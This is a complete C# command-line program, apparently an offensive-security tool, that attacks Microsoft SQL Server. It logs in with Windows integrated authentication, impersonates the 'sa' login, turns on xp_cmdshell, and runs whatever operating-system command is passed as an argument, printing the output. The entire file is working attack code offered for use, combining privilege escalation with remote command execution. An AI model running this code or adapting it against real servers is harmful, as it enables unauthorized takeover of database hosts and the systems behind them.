using System;
using System.Data.SqlClient;
namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                String sqlServer = args[0];
                String database = args[1];
                String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                SqlConnection con = new SqlConnection(conString);

                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }

                String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                String execCmd = "EXEC xp_cmdshell '" + args[2] + "'";

                SqlCommand command = new SqlCommand(impersonateUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_xpcmd, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: " + reader[1]);
                reader.Close();

                con.Close();
            }
            catch
            {
                Console.WriteLine("Invalid Usage!\n\n\tUsage: xpcmdshellCodeExecution.exe <sql server> <database name> <command>\n\n\tExample: xpcmdshellCodeExecution.exe sql.local master whoami");
            }

        }
    }
}